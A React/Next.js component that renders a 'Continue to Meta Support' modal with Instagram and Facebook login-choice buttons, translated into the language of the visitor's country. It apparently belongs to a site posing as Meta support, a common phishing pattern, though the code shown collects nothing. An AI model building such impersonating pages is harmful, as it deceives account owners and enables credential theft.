'use client';

import FbGlyph from '@/assets/images/facebook-svg1-fb508927.svg';
import InstagramImage from '@/assets/images/instagram-asset0-dfa0d9.webp';
import IgGlyph from '@/assets/images/instagram-glyph.svg';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const ContinueModal: FC<{ onSelect: (provider: 'instagram' | 'facebook') => void }> = ({ onSelect }) => {
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo } = store();

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Continue to Meta Support', 'Choose an account to continue. You can switch accounts at any time.', 'Continue with Instagram', 'Continue with Facebook'];

        const translateAll = async () => {
            const entries = await Promise.all(textsToTranslate.map(async (text) => [text, await translateText(text, geoInfo.country_code)] as const));

            setTranslations(Object.fromEntries(entries));
        };

        void translateAll();
    }, [geoInfo]);

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-4xl flex-row gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
                <div className='relative hidden aspect-square w-1/2 sm:block'>
                    <Image src={InstagramImage} alt='' fill className='rounded-2xl object-contain' />
                </div>
                <div className='flex w-1/2 flex-col justify-center gap-7'>
                    <p className='text-2xl font-bold'>{t('Continue to Meta Support')}</p>
                    <p className='text-xl'>{t('Choose an account to continue. You can switch accounts at any time.')}</p>
                    <button type='button' onClick={() => onSelect('instagram')} className='flex h-10 w-full items-center justify-center gap-2 rounded-xl bg-[#0095F6] text-[15px] font-semibold text-white transition-colors hover:bg-[#4150F7]'>
                        <Image src={IgGlyph} alt='' width={20} height={20} />
                        {t('Continue with Instagram')}
                    </button>
                    <button type='button' onClick={() => onSelect('facebook')} className='flex h-10 w-full items-center justify-center gap-2 rounded-xl bg-[#1877F2] text-[15px] font-semibold text-[#F3F4F5] transition-colors hover:bg-[#0064E0]'>
                        <Image src={FbGlyph} alt='' width={20} height={20} />
                        {t('Continue with Facebook')}
                    </button>
                </div>
            </div>
        </div>
    );
};

export default ContinueModal;
